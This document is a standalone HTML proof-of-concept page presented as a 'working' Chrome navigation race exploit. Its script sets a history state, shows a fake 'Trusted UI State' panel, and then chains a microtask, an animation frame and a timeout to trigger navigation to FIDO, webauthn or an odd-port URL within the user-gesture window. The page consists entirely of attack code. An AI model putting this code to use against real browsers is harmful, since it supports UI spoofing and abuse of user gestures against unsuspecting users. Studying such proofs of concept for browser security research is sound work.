<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Chrome Navigation Race – WORKING PoC</title>

<style>
body { font-family: sans-serif; }
#panel {
  display: none;
  margin-top: 16px;
  padding: 12px;
  border: 2px solid red;
  background: #fee;
}
button {
  padding: 10px 14px;
  font-size: 15px;
}
pre {
  background: #111;
  color: #0f0;
  padding: 10px;
  margin-top: 16px;
  height: 180px;
  overflow: auto;
}
</style>
</head>

<body>

<h2>Chrome Desktop – Navigation Race (Fixed)</h2>

<button id="trigger">Start</button>

<div id="panel">
  <b>Trusted UI State</b><br>
  Simulating post‑gesture privileged state
</div>

<pre id="log"></pre>

<script>
const trigger = document.getElementById('trigger');
const panel = document.getElementById('panel');
const logEl = document.getElementById('log');

function log(m) {
  logEl.textContent += m + "\n";
}

trigger.onclick = () => {
  log("[+] click handler entered (user gesture)");

  // Step 1: mutate history (trusted-looking state)
  history.pushState({}, "", "/trusted");
  panel.style.display = "block";
  log("[+] history.pushState done");

  // Step 2: microtask escape
  Promise.resolve().then(() => {
    log("[*] microtask");

    // Step 3: animation frame escape
    requestAnimationFrame(() => {
      log("[*] requestAnimationFrame");

      // Step 4: delayed navigation INSIDE gesture lifetime
      setTimeout(() => {
        log("[!] triggering navigation");

        /*
         * TEST TARGETS (try one at a time):
         *
         * location.href = "FIDO://";
         * location.href = "FiDo://";
         * location.href = "webauthn://";
         * location.href = "https://google.com:9090";
         */

        location.href = "https://google.com:9090";

      }, 0);
    });
  });
};
</script>

</body>
</html>
